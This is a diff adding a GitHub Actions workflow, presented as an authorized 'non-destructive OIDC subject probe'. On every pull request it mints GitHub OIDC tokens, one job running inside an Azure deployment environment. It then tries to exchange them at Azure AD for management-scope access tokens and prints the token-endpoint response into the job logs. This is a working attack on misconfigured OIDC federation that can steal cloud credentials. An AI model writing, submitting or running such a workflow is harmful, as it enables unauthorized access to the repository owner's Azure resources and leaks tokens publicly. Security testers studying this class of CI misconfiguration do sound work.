@@ -1,0 +1,82 @@
+name: c211-76201 non-destructive OIDC subject probe
+# Authorized non-destructive probe (ROE conv-211 §3/§8): mints a GitHub OIDC token and
+# attempts a read-only Azure AD client-credentials exchange with the repository's own
+# publicly declared app id. It creates no resources and changes no repository content.
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  noenv:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          python3 - <<'PYEOF'
+          import json, os, urllib.parse, urllib.request, urllib.error, base64
+          def claims(j):
+              try:
+                  p=j.split('.')[1]; p+='='*(-len(p)%4)
+                  return json.loads(base64.urlsafe_b64decode(p.encode()))
+              except Exception as e:
+                  return {'err':str(e)}
+          base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          try:
+              u=base+'&audience='+urllib.parse.quote('api://AzureADTokenExchange', safe='')
+              r=urllib.request.Request(u, headers={'Authorization':'bearer '+tok})
+              j=json.loads(urllib.request.urlopen(r, timeout=30).read()); jwt=j['value']; c=claims(jwt)
+              print('RESULT '+json.dumps({'kind':'oidc','job':'noenv','iss':c.get('iss'),'aud':c.get('aud'),'sub':c.get('sub'),'event':c.get('event_name'),'ref':c.get('ref')}), flush=True)
+          except Exception as e:
+              print('RESULT '+json.dumps({'kind':'oidc','job':'noenv','error':str(e)}), flush=True); jwt=None
+          if jwt:
+              data=urllib.parse.urlencode({'client_id':'2fd73ead-56be-440e-bf1e-ef7b792c16fc','scope':'https://management.azure.com/.default','grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':jwt}).encode()
+              req=urllib.request.Request('https://login.microsoftonline.com/f542dd61-ecf3-4524-8905-30f2e2a2e967/oauth2/v2.0/token', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=45); code=resp.status; body=resp.read()
+              except urllib.error.HTTPError as e:
+                  code=e.code; body=e.read()
+              except Exception as e:
+                  code=None; body=str(e).encode()
+              b=body.decode('utf-8','replace')
+              print('RESULT '+json.dumps({'kind':'aad','job':'noenv','http':code,'body':b[:900]}), flush=True)
+          print('DONE_NOENV', flush=True)
+          PYEOF
+  withenv:
+    runs-on: ubuntu-latest
+    environment: azure-sandbox-image
+    steps:
+      - name: probe
+        run: |
+          set +e
+          python3 - <<'PYEOF'
+          import json, os, urllib.parse, urllib.request, urllib.error, base64
+          def claims(j):
+              try:
+                  p=j.split('.')[1]; p+='='*(-len(p)%4)
+                  return json.loads(base64.urlsafe_b64decode(p.encode()))
+              except Exception as e:
+                  return {'err':str(e)}
+          base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          try:
+              u=base+'&audience='+urllib.parse.quote('api://AzureADTokenExchange', safe='')
+              r=urllib.request.Request(u, headers={'Authorization':'bearer '+tok})
+              j=json.loads(urllib.request.urlopen(r, timeout=30).read()); jwt=j['value']; c=claims(jwt)
+              print('RESULT '+json.dumps({'kind':'oidc','job':'withenv','iss':c.get('iss'),'aud':c.get('aud'),'sub':c.get('sub'),'event':c.get('event_name'),'ref':c.get('ref')}), flush=True)
+          except Exception as e:
+              print('RESULT '+json.dumps({'kind':'oidc','job':'withenv','error':str(e)}), flush=True); jwt=None
+          if jwt:
+              data=urllib.parse.urlencode({'client_id':'2fd73ead-56be-440e-bf1e-ef7b792c16fc','scope':'https://management.azure.com/.default','grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':jwt}).encode()
+              req=urllib.request.Request('https://login.microsoftonline.com/f542dd61-ecf3-4524-8905-30f2e2a2e967/oauth2/v2.0/token', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=45); code=resp.status; body=resp.read()
+              except urllib.error.HTTPError as e:
+                  code=e.code; body=e.read()
+              except Exception as e:
+                  code=None; body=str(e).encode()
+              b=body.decode('utf-8','replace')
+              print('RESULT '+json.dumps({'kind':'aad','job':'withenv','http':code,'body':b[:900]}), flush=True)
+          print('DONE_WITHENV', flush=True)
+          PYEOF
